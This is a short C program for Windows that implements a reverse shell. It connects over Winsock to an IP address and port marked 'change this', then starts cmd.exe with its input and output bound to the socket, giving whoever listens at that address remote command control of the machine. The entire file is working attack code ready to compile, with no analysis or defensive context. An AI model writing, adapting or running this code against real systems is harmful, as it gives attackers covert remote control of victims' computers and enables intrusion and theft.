#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main()
{
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    int connection;
    char RecvServer[512];
    char ip_addr[] = "127.0.0.1"; // <-- change this
    int port = 8000; // <-- change this

    WSAStartup(MAKEWORD(2,2), &wsa);  // winsock initalisation  
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL); 

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // connect to target server
    if (connection == SOCKET_ERROR)
    {
        printf("[!] Connection to the target failed. Please try again.");
        exit(0);
    }
    else 
    {
        recv(shell, RecvServer, sizeof(RecvServer), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer, 0, sizeof(RecvServer));



    }
}
